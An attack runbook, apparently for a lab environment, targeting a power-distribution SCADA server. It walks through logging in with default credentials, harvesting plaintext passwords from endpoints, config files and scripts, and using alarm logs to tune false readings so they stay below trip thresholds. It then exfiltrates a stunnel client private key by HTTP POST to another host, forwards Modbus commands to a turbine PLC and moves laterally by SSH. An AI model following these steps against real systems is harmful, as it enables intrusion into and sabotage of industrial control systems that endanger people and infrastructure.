# Runbook: distribution-scada

## Entry

Two entry paths. The web interface is the faster credential harvest. SSH gives
an interactive shell on the operational zone with access to the stunnel client
key.

### Web

Port 8080. Default credentials set at installation and never changed.

```powershell
iwr -Uri http://10.10.2.20:8080/ -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
```

The `Authorization` header is `admin:admin` base64-encoded. The dashboard
returns live plant state polled from the historian.

```powershell
iwr -Uri http://10.10.2.20:8080/config -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
```

The `/config` endpoint returns a plaintext credential dump: historian read
credentials (`hist_read / history2017`), SMTP relay password (`plantmail123`),
and the web credentials themselves. Added during commissioning for the monitoring
integration and never removed.

```powershell
iwr -Uri http://10.10.2.20:8080/historian-pass -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
```

Proxies a historian `/report` query. Added by an engineer who kept forgetting
the historian password. Also never removed.

An unauthenticated request to `http://10.10.2.20:8080/` returns a 401 with
`X-Powered-By: UU-SCADA/2.1 Flask/2.3 Python/3.11` on every response. Version
disclosure before authentication.

### SSH

Credentials are documented in `engineering_notes.txt` on the engineering
workstation and in `plc-access-2019.conf` in the 2019 backup archive.

```
ssh scada_admin@10.10.2.20
```

Password: `W1nd0ws@2016`. Drops into the Windows Server 2016 facade.

## Identity and host enumeration

```powershell
PS C:\Users\scada_admin> whoami
```

Returns `ot.local\scada_admin`.

```powershell
PS C:\Users\scada_admin> hostname
```

Returns `SCADA-SRV01`.

```powershell
PS C:\Users\scada_admin> ipconfig
```

Single NIC at `10.10.2.20`. Operational zone only. No direct path to the
control network, but the stunnel client on this host gives authenticated Modbus
access to `uupl-modbus-gw:8502`, which forwards to the turbine PLC.

```powershell
PS C:\Users\scada_admin> netstat -ano
```

Port 22 (sshd), port 8080 (Flask). Stunnel is listening on `127.0.0.1:5020`.
The `127.0.0.1:5020` socket is the local Modbus-over-TLS relay: anything written
to it goes through the TLS tunnel to the gateway and arrives at the PLC as plain
Modbus TCP.

## Configuration file

```powershell
PS C:\Users\scada_admin> cat C:\SCADA\Config\scada.ini
```

The complete credential set for this host and its dependencies:

- Historian: `hist_read / history2017`
- Web interface: `admin / admin`
- SMTP relay: `alarms@uupl.am / plantmail123`
- SSH admin: `scada_admin / W1nd0ws@2016`, with a note that IT raised a ticket
  to rotate it in 2022. The ticket was closed. It was not rotated.

```powershell
PS C:\Users\scada_admin> cat C:\SCADA\Config\alarm_recipients.txt
```

Notification email addresses for critical and warning alarms. Useful for
understanding who gets paged when the process trips.

## Scripts

```powershell
PS C:\Users\scada_admin> cat C:\SCADA\Scripts\send_alarm.bat
```

The SMTP alarm relay batch script. The password (`plantmail123`) is in a `set`
statement. Same credential as in `scada.ini` and in `send_alarm.ps1` on the
engineering workstation.

```powershell
PS C:\Users\scada_admin> cat C:\SCADA\Scripts\poll_historian.ps1
```

Historian query script. The historian credentials (`hist_read / history2017`)
are hardcoded in the `$Pass` variable. The script queries all assets and prints
the last reading for each.

## Alarm log

```powershell
PS C:\Users\scada_admin> cat C:\SCADA\Logs\alarm_log_2026.txt
```

Trip events with timestamps, asset names, measured values, and trip thresholds.
The log reveals the operational envelope: at what RPM the overspeed alarm fires,
what voltage triggers a feeder trip, which feeders have historically been
unstable. Useful for calibrating a false-reading injection to stay below the
alarm threshold.

## PSReadLine history

```powershell
PS C:\Users\scada_admin> cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Prior sessions include historian API queries and an SSH session to the historian
(`ssh hist_admin@10.10.2.10`). Confirms the historian is the primary data source
and that the operator SSHes to it directly.

## Desktop quick reference

```powershell
PS C:\Users\scada_admin> cat Desktop\README.txt
```

One-page reference card for the SCADA system: web URL, config path, historian
address. Written for the operator; reads like a credential cheat sheet.

## Stunnel client key (HEX-5103)

This is the highest-value artefact on this host.

The stunnel client authenticates to `uupl-modbus-gw:8502` using a client
certificate. The key was set world-readable so the monitoring user could read
it. The permission was never tightened. Risk accepted 2020, ticket HEX-5103.

The cert files are in `C:\SCADA\Config\certs\`.

```powershell
PS C:\Users\scada_admin> dir C:\SCADA\Config\certs\
```

Three files: `client.crt`, `client.key`, `ca.crt`. The key is world-readable.

```powershell
PS C:\Users\scada_admin> cat C:\SCADA\Config\certs\client.key
PS C:\Users\scada_admin> cat C:\SCADA\Config\certs\client.crt
PS C:\Users\scada_admin> cat C:\SCADA\Config\certs\ca.crt
```

PEM blocks. The operational zone has no direct route to unseen-gate; exfil via
wizzards-retreat (10.10.2.3), which is on the same subnet. Start the receiver there
first, then send:

```powershell
PS C:\Users\scada_admin> iwr -Method POST -Uri http://10.10.2.3:9999/client.key -InFile C:\SCADA\Config\certs\client.key
PS C:\Users\scada_admin> iwr -Method POST -Uri http://10.10.2.3:9999/client.crt -InFile C:\SCADA\Config\certs\client.crt
PS C:\Users\scada_admin> iwr -Method POST -Uri http://10.10.2.3:9999/ca.crt     -InFile C:\SCADA\Config\certs\ca.crt
```

Receiver setup, pull to unseen-gate, and using the certs against the gateway:
`books2/scada-cert-exfil.md`.

With an authenticated TLS session open, forward Modbus commands to the PLC via
socat or a Python script. The gateway verifies the client cert; the PLC sees
plain Modbus TCP and has no further authentication.

## Lateral movement

The SCADA server is primarily a credential aggregation point. From here:

```powershell
PS C:\Users\scada_admin> ssh hist_admin@10.10.2.10
PS C:\Users\scada_admin> ssh engineer@10.10.2.30
```

Both credentials are in `scada.ini`. The historian SSH opens the `/ingest`
poisoning path. The engineering workstation SSH opens the control-zone Modbus
path. The stunnel client key opens the gateway directly without needing either.
